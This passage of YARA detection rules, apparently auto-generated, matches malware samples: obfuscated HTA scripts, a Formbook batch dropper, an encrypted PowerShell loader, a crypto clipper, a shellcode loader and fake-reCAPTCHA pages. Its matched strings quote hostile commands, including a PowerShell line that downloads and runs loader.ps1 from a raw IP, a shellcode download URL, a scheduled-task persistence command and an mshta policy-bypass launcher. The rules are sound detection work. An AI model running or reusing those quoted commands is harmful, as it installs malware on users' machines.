      $s10 = "0x472b2b._0x1e6a4c) + _0x4716cf(-a0_0x472b2b._0x7ffe3c, -a0_0x472b2b._0x4fcbc0) + '\\x65'] = _0x4716cf(0x17d, a0_0x472b2b._0x4ed" ascii /* score: '12.00'*/
      $s11 = "+ parseInt(_0x30da4d(a0_0x265703._0x50b9e0, 0x130)) / 0x3 + parseInt(_0x30da4d(a0_0x265703._0x2baa24, 0x310)) / 0x4 + -parseInt(" ascii /* score: '12.00'*/
      $s12 = "2c119(0x93, a0_0x54ac31._0x53b405)]('\\x2c')[0x1], _0x9d16be = new ActiveXObject(_0x62c119(-0x66, -a0_0x54ac31._0x744e89) + _0x6" ascii /* score: '12.00'*/
      $s13 = "    return _0x1c49cd << _0xe0a61d | _0x1c49cd >>> 0x20 - _0xe0a61d;" fullword ascii /* score: '12.00'*/
      $s14 = "5eaf8f) + _0x39236b(-0xb7, -0x32) + _0x1c8b62[_0x39236b(0x2b4, a0_0x3d0fc5._0x10acba)] + '\\x0a', _0x40aa25 += _0x39236b(-a0_0x3" ascii /* score: '12.00'*/
      $s15 = "0x2dc23c[0x1], _0x40366b = new ActiveXObject(_0x39236b(-0xf7, -a0_0x3d0fc5._0x3196db) + _0x39236b(a0_0x3d0fc5._0x21c5fe, 0x265) " ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1000KB and
      8 of them
}

rule ecef9bc51da99f21e9d4c747c80ab1c1883249d40b751007f0c5d0ad85e593f8_ecef9bc5 {
   meta:
      description = "_subset_batch - file ecef9bc51da99f21e9d4c747c80ab1c1883249d40b751007f0c5d0ad85e593f8_ecef9bc5.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ecef9bc51da99f21e9d4c747c80ab1c1883249d40b751007f0c5d0ad85e593f8"
   strings:
      $s1 = "00aa7(0x2a0, a0_0x1d1b91._0x8645e1), _0xa545da = GetObject(_0x500aa7(a0_0x1d1b91._0x1a36dd, a0_0x1d1b91._0x1da519) + '\\x74\\x73" ascii /* score: '13.00'*/
      $s2 = "1050(0x20d, a0_0x387406._0x373143) + _0x131050(a0_0x387406._0xc04e7b, 0x436) + '\\x79\\x73\\x74\\x65\\x6d'), _0x456034 = new Enu" ascii /* score: '13.00'*/
      $s3 = "0x78, -0x157)]['\\x74\\x6f\\x4c\\x6f\\x77\\x65' + _0x78438a(0x1d4, 0xe3)]() === _0x78438a(-a0_0x4dfedd._0x310f6c, -0xec) + '\\x6" ascii /* score: '12.00'*/
      $s4 = "0xf311d2[_0x58885e + 0x0], 0x7, -0x28955b88), _0x24814a, _0x437447, _0x1bb275[_0x58885e + 0x1], 0xc, -0x173848aa), _0xa5bfaa, _0" ascii /* score: '12.00'*/
      $s5 = "x24814a, _0x5860e4[_0x58885e + 0x2], 0x11, 0x242070db), _0x409a01, _0xa5bfaa, _0x12f27e[_0x58885e + 0x3], 0x16, -0x3e423112), _0" ascii /* score: '12.00'*/
      $s6 = ", _0xfaf78b[_0x58885e + 0x4], 0x7, -0xa83f051), _0x24814a, _0x437447, _0x54b251[_0x58885e + 0x5], 0xc, 0x4787c62a), _0xa5bfaa, _" ascii /* score: '12.00'*/
      $s7 = "_0x24814a, _0x17a7a1[_0x58885e + 0x7], 0x10, -0x944b4a0), _0x409a01, _0xa5bfaa, _0x4d6799[_0x58885e + 0xa], 0x17, -0x41404390), " ascii /* score: '12.00'*/
      $s8 = " _0x147710(a0_0x3f5bff._0x2de733, 0x1c9) + '\\x73'), _0x198e82 = new _0xdfc174(_0x147710(-0x171, -0xf3) + _0x147710(0x119, a0_0x" ascii /* score: '12.00'*/
      $s9 = ", _0x24814a, _0x3e3c30[_0x58885e + 0x3], 0x10, -0x2b10cf7b), _0x409a01, _0xa5bfaa, _0x49efec[_0x58885e + 0x6], 0x17, 0x4881d05)," ascii /* score: '12.00'*/
      $s10 = "3d[_0x7f5d9b(a0_0x5b1bb9._0x49f9fc, -a0_0x5b1bb9._0x4c531d)](_0x1d30cb++)), _0x13b712 = this['\\x5f\\x6b\\x65\\x79\\x53\\x74' + " ascii /* score: '12.00'*/
      $s11 = "0x402ae2 = _0x402ae2 + String[_0x7f5d9b(-0x207, -0xf4) + _0x7f5d9b(-a0_0x5b1bb9._0x544e0a, -a0_0x5b1bb9._0xe5df71)](_0x14e17a) :" ascii /* score: '12.00'*/
      $s12 = "c'), _0xed76d7 = _0x5b9445[_0x78438a(0x5a, -0x149) + '\\x6b'](0x0), _0x38cc41 = _0xed76d7[_0x78438a(0x68, a0_0x4dfedd._0x269a0f)" ascii /* score: '12.00'*/
      $s13 = "72, -a0_0x4dfedd._0x49f832) + '\\x63\\x74');" fullword ascii /* score: '12.00'*/
      $s14 = "61, -a0_0x4dfedd._0x3282f1) + '\\x61\\x6c'] = _0x78438a(a0_0x4dfedd._0x158de9, 0x1), _0x31cd34[_0x78438a(a0_0x4dfedd._0x4633ee, " ascii /* score: '12.00'*/
      $s15 = " _0x24814a, _0x520325[_0x58885e + 0x7], 0xe, 0x676f02d9), _0x409a01, _0xa5bfaa, _0x543826[_0x58885e + 0xc], 0x14, -0x72d5b376), " ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 900KB and
      8 of them
}

rule faccba1639a28db4fae397fa9af71f8210e7b486286e305249524ae76790cd7d_faccba16 {
   meta:
      description = "_subset_batch - file faccba1639a28db4fae397fa9af71f8210e7b486286e305249524ae76790cd7d_faccba16.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "faccba1639a28db4fae397fa9af71f8210e7b486286e305249524ae76790cd7d"
   strings:
      $s1 = "(-a0_0x206e00._0x94efda, -0x1d5), _0x18d5d6 = GetObject(_0x1445da(a0_0x206e00._0x53013a, a0_0x206e00._0x2397c1) + _0x1445da(0x1d" ascii /* score: '17.00'*/
      $s2 = "a93, a0_0xc7abdd._0x43c755) + '\\x61\\x62\\x6c\\x65') !== -0x1)" fullword ascii /* score: '12.00'*/
      $s3 = "    return _0x180bf9 << _0x1a1b86 | _0x180bf9 >>> 0x20 - _0x1a1b86;" fullword ascii /* score: '12.00'*/
      $s4 = "a58 + 0x5], 0x15, -0x36c5fc7), _0x3c724b = _0xade403(_0x3c724b, _0xb5c7a4 = _0x216c23(_0xb5c7a4, _0x48436a = _0x4ba4ea(_0x48436a" ascii /* score: '12.00'*/
      $s5 = "0x1, _0x16b28d[_0x2ddce7(0x867, a0_0x55031f._0x17d4e0) + '\\x68'] - 0x1);" fullword ascii /* score: '12.00'*/
      $s6 = " '\\x74'](_0xa6409c++)), _0x2b6c7c = this[_0x1445da(a0_0x206e00._0x267622, -0x119) + '\\x74\\x72']['\\x69\\x6e\\x64\\x65\\x78' +" ascii /* score: '12.00'*/
      $s7 = "0x181d46 + 0x0], 0x6, -0xbd6ddbc), _0x3b7a5b, _0x19975d, _0x19bcf3[_0x181d46 + 0x7], 0xa, 0x432aff97), _0x312ebe, _0x3b7a5b, _0x" ascii /* score: '12.00'*/
      $s8 = "b, 0x4bdecfa9), _0x48436a, _0x55b1ed, _0x1b14e2[_0x516a58 + 0x7], 0x10, -0x944b4a0), _0xb5c7a4, _0x48436a, _0x3fe559[_0x516a58 +" ascii /* score: '12.00'*/
      $s9 = "37._0x3f8010, 0x41) + '\\x43\\x4c\\x41\\x53\\x53' + '\\x45\\x53\\x5f\\x52\\x4f' + _0x13523f(0xeb, -a0_0xbcfa37._0x204e7d) + _0x2" ascii /* score: '12.00'*/
      $s10 = "f) && ('\\x52\\x57\\x67\\x54\\x71' !== _0x459166(-0xb1, -0xfc) ? _0x552c0c = _0x2282b6(_0xa57432 + _0x45f887 + _0x31a219())[_0x4" ascii /* score: '12.00'*/
      $s11 = ", -a0_0x145c68._0x5e4ee7) + _0x485739(a0_0x145c68._0x64afeb, -0x196)]);" fullword ascii /* score: '12.00'*/
      $s12 = ", _0x55b1ed, _0x3c724b, _0xb5c7a4, _0x3ff633[_0x516a58 + 0x0], 0x6, -0xbd6ddbc), _0x55b1ed, _0x3c724b, _0x2f9b18[_0x516a58 + 0x7" ascii /* score: '12.00'*/
      $s13 = "32359) + _0x3e0736(a0_0x455894._0xcfda48, 0x1a5) + _0x3e0736(-a0_0x455894._0x2b839a, -0x1d8) + _0x3e0736(-a0_0x455894._0x38b5bf," ascii /* score: '12.00'*/
      $s14 = "f8b92[_0x30ae46 + 0x7], 0x16, -0x2b96aff), _0x261df0 = _0x2dfc96(_0x11a343, _0x2eabaf = _0x5a5985(_0x162566, _0x19f18c = _0x1ac3" ascii /* score: '12.00'*/
      $s15 = "0x48dd57, -0x59) + '\\x72'), _0x5eabbc = _0x40399e[_0x2436a8(0x2a9, a0_0x1ec72b._0x57f403) + _0x2436a8(a0_0x1ec72b._0x13b893, a0" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__904c9251 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_904c9251.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "904c9251dc3b04216d23c15412aebd71681146091a49aca22a6382373e923ae7"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "QqjJpd9kQC4jm6Al1bT.rragwn9YYUCrMTnHwAw+dNIGrnAgHdRCpwCImFH+rij4OxAbVq8aBlp2bFg`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s4 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aTtY" fullword ascii /* score: '27.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s7 = "<!-- List of Windows versions this application has been tested on and designed for. Uncomment the appropriate elements to let Wi" ascii /* score: '19.00'*/
      $s8 = "QqjJpd9kQC4jm6Al1bT.rragwn9YYUCrMTnHwAw+dNIGrnAgHdRCpwCImFH+rij4OxAbVq8aBlp2bFg`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s9 = "49.exe" fullword wide /* score: '16.00'*/
      $s10 = "Process " fullword wide /* score: '15.00'*/
      $s11 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&System.Globalization" ascii /* score: '14.00'*/
      $s12 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s13 = "payload20" fullword ascii /* score: '14.00'*/
      $s14 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s15 = "ture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule Formbook_signature__47dd1fc6 {
   meta:
      description = "_subset_batch - file Formbook(signature)_47dd1fc6.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "47dd1fc6d808f2e0912cdd4d8a2e0a116830d03f4cebb2b416d4394cf18ecdb5"
   strings:
      $x1 = "%POSH% -Command \"$p = (Get-WmiObject Win32_Process -Filter ProcessId=$pedestrianized).ParentProcessId; (Get-WmiObject Win32_Pro" ascii /* score: '35.00'*/
      $x2 = "%POSH% -Command \"$p = (Get-WmiObject Win32_Process -Filter ProcessId=$pedestrianized).ParentProcessId; (Get-WmiObject Win32_Pro" ascii /* score: '35.00'*/
      $x3 = "for /f %%d in ( '%POSH% -Command \"Get-Date -UFormat '%%H%%M%%S'\" ^<nul' ) do (" fullword ascii /* score: '31.00'*/
      $s4 = "if not defined wsnonclassic.ini.command set wsnonclassic.ini.command=%WINDIR%\\system32\\cscript.exe //NoLogo" fullword ascii /* score: '30.00'*/
      $s5 = "echo.    command=%%windir%%\\system32\\cscript.exe //nologo" fullword ascii /* score: '29.00'*/
      $s6 = "echo.new ActiveXObject^('Scripting.FileSystemObject'^).DeleteFile^('!wsnonclassic.execute:\\=\\\\!'^);" fullword ascii /* score: '29.00'*/
      $s7 = "if not defined wsnonclassic.ini.execute set \"wsnonclassic.ini.execute=%TEMP%\\$$$%~n0_$UID.wsf\"" fullword ascii /* score: '28.00'*/
      $s8 = "set GREP=%windir%\\System32\\findstr.exe" fullword ascii /* score: '27.00'*/
      $s9 = "set WMIC=%windir%\\System32\\Wbem\\wmic.exe" fullword ascii /* score: '27.00'*/
      $s10 = "set FIND=%windir%\\System32\\find.exe" fullword ascii /* score: '27.00'*/
      $s11 = "echo.    /compile     - Compile but not execute. Just store to a temporary file" fullword ascii /* score: '26.00'*/
      $s12 = "'%WMIC% Process call create \"%windir%\\System32\\wscript.exe //b\" 2^>nul'" fullword ascii /* score: '25.00'*/
      $s13 = "%wsnonclassic.ini.command% \"%wsnonclassic.execute%\" %wsnonclassic.args%" fullword ascii /* score: '25.00'*/
      $s14 = "call :wsnonclassic.execute.find.powershell powershell.exe" fullword ascii /* score: '25.00'*/
      $s15 = "echo %wsnonclassic.execute% | %FIND% \"$UID\">nul 2>&1 && call :wsnonclassic.execute.uid" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6870 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule fa2bbda2b3b2981513531bd7cea1afcf_imphash_ {
   meta:
      description = "_subset_batch - file fa2bbda2b3b2981513531bd7cea1afcf(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "830871f5b49503e99e52a231d9b5faac6f57a94071543e2249b580390f964620"
   strings:
      $x1 = "mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell.exe -ExecutionPolicy Bypass -NoProfile -File %AppData%\\Microsof" ascii /* score: '54.00'*/
      $x2 = "mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell.exe -ExecutionPolicy Bypass -NoProfile -File %AppData%\\Microsof" ascii /* score: '54.00'*/
      $x3 = "C:\\Users\\wew19\\OneDrive\\Desktop\\K.G.B BOT\\ITHealthMonitor - Steam\\Release\\vstdlib_s.pdb" fullword ascii /* score: '41.00'*/
      $s4 = "function Execute-Command {" fullword ascii /* score: '30.00'*/
      $s5 = "                Execute-Command -command $command" fullword ascii /* score: '29.00'*/
      $s6 = "#---[ Command Execution Functions ]---" fullword ascii /* score: '26.00'*/
      $s7 = "    elseif ($command.StartsWith(\"download_and_run:\")) {" fullword ascii /* score: '22.00'*/
      $s8 = "tmp7A6D.GetPortableOsVersionInformation" fullword ascii /* score: '21.00'*/
      $s9 = "    A client script for monitoring system health and executing remote commands." fullword ascii /* score: '21.00'*/
      $s10 = "vstdlib_s.dll" fullword ascii /* score: '20.00'*/
      $s11 = "    [DllImport(\"user32.dll\", CharSet = CharSet.Unicode, SetLastError = true)]" fullword ascii /* score: '20.00'*/
      $s12 = "tmp7A6D.CommandLine" fullword ascii /* score: '19.00'*/
      $s13 = "$targetKeywords = $encryptedTargetKeywords | ForEach-Object {" fullword ascii /* score: '17.00'*/
      $s14 = "?V_ParseShellCommandLinePOSIX@@YAXPBDAAV?$CUtlVector@VCUtlString@@V?$CUtlMemory@VCUtlString@@@@@@HPAPBD@Z" fullword ascii /* score: '17.00'*/
      $s15 = "function Get-OperatingSystemInfo {" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule e2cbf2202d7a77c97e69e024fe8f4ecbe70d15c9ffbeb5f467161a7dfe9c776e_e2cbf220 {
   meta:
      description = "_subset_batch - file e2cbf2202d7a77c97e69e024fe8f4ecbe70d15c9ffbeb5f467161a7dfe9c776e_e2cbf220.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e2cbf2202d7a77c97e69e024fe8f4ecbe70d15c9ffbeb5f467161a7dfe9c776e"
   strings:
      $s1 = "  (function(_0x3fc648,_0x59a5a0){var a0_0x4e8f2e={_0x2a9d79:0x177,_0x5abef8:0x172,_0x287cde:0x174,_0x195e0e:0x173,_0x55bdec:0x17" ascii /* score: '16.00'*/
      $s2 = "  <script type=\"text/javascript\">" fullword ascii /* score: '10.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "=GetObject('\\x77\\x69'+'\\x6e\\x6d'+'\\x67\\x6d'+'\\x74\\x73'+'\\x3a\\x5c'+'\\x5c\\x2e'+'\\x5c\\x72'+'\\x6f\\x6f'+'\\x74\\x5c'+" ascii /* score: '9.00'*/
      $s5 = "0\\x74'+'\\x69\\x6f'+'\\x6e']+'\\x0a\\x0a';}}}else{if(_0x1e1e37['\\x6d\\x61'+'\\x74\\x63'+'\\x68'](/^\\d+\\.\\d+$/))_0x2a515b[_0" ascii /* score: '9.00'*/
      $s6 = "='\\x69\\x44'+'\\x57\\x50'+'\\x65'){var _0x4bf736=GetObject('\\x77\\x69'+'\\x6e\\x6d'+'\\x67\\x6d'+'\\x74\\x73'+'\\x3a\\x5c'+'" ascii /* score: '9.00'*/
      $s7 = "\\x75'+'\\x73\\x65'+'\\x72\\x6e'+'\\x61\\x6d'+'\\x65\\x3d')+encodeURIComponent(_0x55f591)+('\\x26\\x63'+'\\x6f\\x72'+'\\x70\\x3d" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 500KB and
      all of them
}

rule e2de929008063320fba689db3e7d1be5a4ea6aca256e74e6b4659dc7b2379f41_e2de9290 {
   meta:
      description = "_subset_batch - file e2de929008063320fba689db3e7d1be5a4ea6aca256e74e6b4659dc7b2379f41_e2de9290.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e2de929008063320fba689db3e7d1be5a4ea6aca256e74e6b4659dc7b2379f41"
   strings:
      $x1 = "$encryptedPayload = 'cGXHM5PetrdaDA1sF9iBanNbTHCVQL04sKxH9JUyhPKMJ0CjqZCeXgVwNWznt3ZnIaFonjNz0TN1M6slFLKMkjL6dD5/rmOklsRUZVJ58lE" ascii /* score: '73.00'*/
      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "xie2tSkg48boqqIPrmUmouPXM0v8dNmXLoWaOAkY+JzDf15OzDEkMfglDmUtEXpFwyCXDYY2lmgordi2m5irtoqiYZeKESUxa7lNs1SLjCGF/SZHqwKZE7cppry5WR9y" ascii /* score: '22.00'*/
      $s4 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s5 = "hiF3RyrJANISH/g3b+P5tJ3pec3h8JjLiFcVK29hf9q3PzvYrbFHJBM8Kx1vMS13qsxdhMGQtEmPsIsO4qZQcCOh7BH1TdCj75YxFwraL7+tvC/PxiqAfU7dX7ybZ3ma" ascii /* score: '22.00'*/
      $s6 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s7 = "PNH20hPmpqsUTLvUjzw4XUblOg1QYoHgo5AI7t0R329s/JZ7glsPYcisIoY2bKEmF8SHM+4AxGUCtwv3daf0J97A8LdQ86ZEqn1wcc+V8SKu7VuJTvfFKTky49Y/HqMQ" ascii /* score: '21.00'*/
      $s8 = "SlmGeFau5O2+898FElANfQ2kwgetzpGd/4aeDumtr6Tey+ImlXbEIXuHInuJWvieE7pn3d1vTI6tu+dlShM3vsMNZarXHqPMIeESpY8RPwb62ceyGKxexlc3AoyAfnwM" ascii /* score: '21.00'*/
      $s9 = "JTX1C4nnt+JghDQv2LBpEYe4Ey68WGSlAb0GGCTPoTjIFXhlevI3fDy6pSZyoz+oc0meTs3ZZrt7i2t6sddZFERwaAOSurPaKwClZGycDgJNbKvdF5Z1dP8ggEtWw8Bc" ascii /* score: '21.00'*/
      $s10 = "Ih1r1/Q1IrKHP5oHoU5Qs/fQZQBt3XcFp9A3i1X/R2qqv9sPZiVmK2Y4veS2PugdjrYWFPQkI204DuMPyEnn5nNZuxGuh2uaApUXISRk6I7iGv59ukHoolY3RHeATsCC" ascii /* score: '21.00'*/
      $s11 = "SfBEyE1BYYzP0CnwZo2SFzpD8y/j7C0ZJ4sKDLuUirFjKhOy5h73G+vvABahtFJ8ebrGYyC3dMOB6zMFf/fajvtPCRi+Bzwp882NTXkwhgAR4Vu28BjlFJzN/QVzIubv" ascii /* score: '21.00'*/
      $s12 = "myxd7kliNT4psP93lqCjZY5R8/qFtzY6J/WlOg5pGKM2g7p0CVfJqzReX35CY+RlOM3bka72CcEP54l9ioGuQ5/F1x7GKrNZryhQxBkmL75evjoRQ3SBD3qi4ZB4Ktz7" ascii /* score: '21.00'*/
      $s13 = "8m8VE3jl7WUXKgUkQXR73bo61cl2kVbaf5D0ga75F9bXg/mHITOQ9Yh6Q1DUmp4/qth9xtYhpjbvC3+GmoBvJHIOJnrbtWiRoJB+w5MVYm0JRt9JY0y9NwPJPNwENAi7" ascii /* score: '21.00'*/
      $s14 = "3OxdxY6AY6W9P0CfESF59jZBVNVALwGkhtzLiasmtpWJJhRGvZainQFg4corLAPYNF3OYWEjBTgbpciJRuzt5SupTl3kSQf8z+8j39nqTcMBJkEwFay2Qjo4/FQTfGgy" ascii /* score: '21.00'*/
      $s15 = "S2sFaOjGetYAq3ZT8Cs3ifgrFKHTms05NDOke2yvPP5Ls8hbios2sOth/ScdKHEG3JgGhxyT71SXJZtp7pyHVUCs7nnx6r7N3mByaD2fL7rOAPmqJMmnU24cOQ3595ty" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule e96fa14842ebaa8dcfdbb6f82495056842d04ee8bf6ad7a08c4ec59138bd0578_e96fa148 {
   meta:
      description = "_subset_batch - file e96fa14842ebaa8dcfdbb6f82495056842d04ee8bf6ad7a08c4ec59138bd0578_e96fa148.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e96fa14842ebaa8dcfdbb6f82495056842d04ee8bf6ad7a08c4ec59138bd0578"
   strings:
      $s1 = "  function hookSetTimeout(obj, shouldBypass = false) {" fullword ascii /* score: '15.00'*/
      $s2 = "            dexName ? console.log(dexName + part2) : console.log(part2);" fullword ascii /* score: '15.00'*/
      $s3 = "  function findBestMatch(targetString, stringArray) {" fullword ascii /* score: '14.00'*/
      $s4 = "    const contentType = response.headers.get('Content-Type') || '';" fullword ascii /* score: '12.00'*/
      $s5 = "let rund = -53;" fullword ascii /* score: '11.00'*/
      $s6 = "    const parsedResponseBody = typeof processedResponseBody == 'string' ? processedResponseBody : JSON.stringify(processedRespon" ascii /* score: '10.00'*/
      $s7 = "    const parsedResponseBody = typeof processedResponseBody == 'string' ? processedResponseBody : JSON.stringify(processedRespon" ascii /* score: '10.00'*/
      $s8 = "    if (shouldBypass) {" fullword ascii /* score: '10.00'*/
      $s9 = "  const addressList = [\"Coinbase\", \"Binance\", \"Huobi\"];" fullword ascii /* score: '10.00'*/
      $s10 = "    const processedResponseBody = modifyResponse(responseBody);" fullword ascii /* score: '10.00'*/
      $s11 = "          costs[i][j] = Math.min(costs[i - 1][j], costs[i][j - 1], costs[i - 1][j - 1]);" fullword ascii /* score: '10.00'*/
      $s12 = "    XMLHttpRequest.prototype.open = function (method, url, async, user, password) {" fullword ascii /* score: '10.00'*/
      $s13 = "    'getInterceptCount': () => interceptCount," fullword ascii /* score: '9.00'*/
      $s14 = " \"20\", \"21\"];" fullword ascii /* score: '9.00'*/ /* hex encoded string ' !' */
      $s15 = "\", \"40\"];" fullword ascii /* score: '9.00'*/ /* hex encoded string '@' */
   condition:
      uint16(0) == 0x656c and filesize < 40KB and
      8 of them
}

rule ee062cd3fb8c8bd401963f94ddded18925487600880367a8272dffccb0f18b86_ee062cd3 {
   meta:
      description = "_subset_batch - file ee062cd3fb8c8bd401963f94ddded18925487600880367a8272dffccb0f18b86_ee062cd3.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee062cd3fb8c8bd401963f94ddded18925487600880367a8272dffccb0f18b86"
   strings:
      $x1 = ";for each_process in ComObjGet(\"winmgmts:\").ExecQuery(\"Select * from Win32_Process where Name = 'telegram.exe'\") {" fullword ascii /* score: '51.00'*/
      $x2 = "targetProcess := \"C:\\Windows\\System32\\rundll32.exe\"" fullword ascii /* score: '43.00'*/
      $x3 = "Run('cmd /C C:\\Users\\Pub^lic\\91\\^up^dat^e.exe /cr^ea^te /s^c onl^og^on /tn T^Up^deta /rl hig^he^st /tr C:\\Use^rs\\Pu^blic" ascii /* score: '40.00'*/
      $x4 = "Run('cmd /C C:\\Users\\Pub^lic\\91\\^up^dat^e.exe /cr^ea^te /s^c onl^og^on /tn T^Up^deta /rl hig^he^st /tr C:\\Use^rs\\Pu^blic" ascii /* score: '40.00'*/
      $x5 = "    FileCopy \"C:\\Windows\\System32\\schtasks.exe\", \"C:\\Users\\Public\\91\\update.exe\"" fullword ascii /* score: '32.00'*/
      $x6 = "if !FileExist(\"C:\\Users\\Public\\91\\update.exe\")" fullword ascii /* score: '31.00'*/
      $s7 = "downloadUrl := \"http://154.23.127.134/1.bin\"" fullword ascii /* score: '24.00'*/
      $s8 = " shellcode" fullword ascii /* score: '23.00'*/
      $s9 = ";    telegramPath := each_process.ExecutablePath" fullword ascii /* score: '23.00'*/
      $s10 = "                    \"Str\", targetProcess, " fullword ascii /* score: '20.00'*/
      $s11 = "        hProcess := NumGet(pi, 0, \"Ptr\")" fullword ascii /* score: '15.00'*/
      $s12 = ";ProcessSetPriority(\"High\")" fullword ascii /* score: '15.00'*/
      $s13 = "ProcessSetPriority \"High\"" fullword ascii /* score: '15.00'*/
      $s14 = "mp.exe /F', \"\", \"Hide\")" fullword ascii /* score: '15.00'*/
      $s15 = "hProcess := 0" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x4e23 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule eb26854789ea37078e9546785c5a2f5fbd67cd6536175f85c211deabad829e15_eb268547 {
   meta:
      description = "_subset_batch - file eb26854789ea37078e9546785c5a2f5fbd67cd6536175f85c211deabad829e15_eb268547.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eb26854789ea37078e9546785c5a2f5fbd67cd6536175f85c211deabad829e15"
   strings:
      $x1 = "            const textToCopy = `cmd.exe /c start /min powershell.exe -ep bypass -C \"Invoke-WebRequest http://128.140.70.83:8080" ascii /* score: '62.00'*/
      $x2 = "            const textToCopy = `cmd.exe /c start /min powershell.exe -ep bypass -C \"Invoke-WebRequest http://128.140.70.83:8080" ascii /* score: '53.00'*/
      $s3 = "loader.ps1 -OutFile $env:TEMP\\\\a.ps1; & \\\"$env:TEMP\\\\a.ps1\\\"\" # " fullword ascii /* score: '28.00'*/
      $s4 = "                document.execCommand(\"copy\");" fullword ascii /* score: '19.00'*/
      $s5 = " \"I am not a robot - reCAPTCHA ID: ${verification_id} - Mandatory reCaptcha System 2025\"`;" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x200a and filesize < 5KB and
      1 of ($x*) and all of them
}

rule f6cd1aaeccf720195c69585ff1b0ad0bc8301826cbb5f56ec5aa3c67b9f769f0_f6cd1aae {
   meta:
      description = "_subset_batch - file f6cd1aaeccf720195c69585ff1b0ad0bc8301826cbb5f56ec5aa3c67b9f769f0_f6cd1aae.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f6cd1aaeccf720195c69585ff1b0ad0bc8301826cbb5f56ec5aa3c67b9f769f0"
   strings:
      $x1 = "            const textToCopy = `cmd.exe /c start /min powershell.exe -ep bypass -C \"Invoke-WebRequest http://128.140.70.83:8080" ascii /* score: '62.00'*/
      $x2 = "            const textToCopy = `cmd.exe /c start /min powershell.exe -ep bypass -C \"Invoke-WebRequest http://128.140.70.83:8080" ascii /* score: '53.00'*/
      $s3 = "loader.ps1 -OutFile $env:TEMP\\\\a.ps1; & \\\"$env:TEMP\\\\a.ps1\\\"\" # " fullword ascii /* score: '28.00'*/
      $s4 = "                document.execCommand(\"copy\");" fullword ascii /* score: '19.00'*/
      $s5 = "    <script src=\"https://cdn.tailwindcss.com\"></script>" fullword ascii /* score: '18.00'*/
      $s6 = "                        <img src=\"https://www.gstatic.com/recaptcha/api2/logo_48.png\" class=\"captcha-logo\" alt=\"reCAPTCHA L" ascii /* score: '13.00'*/
      $s7 = "    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css\">" fullword ascii /* score: '12.00'*/
      $s8 = "    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">" fullword ascii /* score: '12.00'*/
      $s9 = "    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;700&display=swap\" r" ascii /* score: '12.00'*/
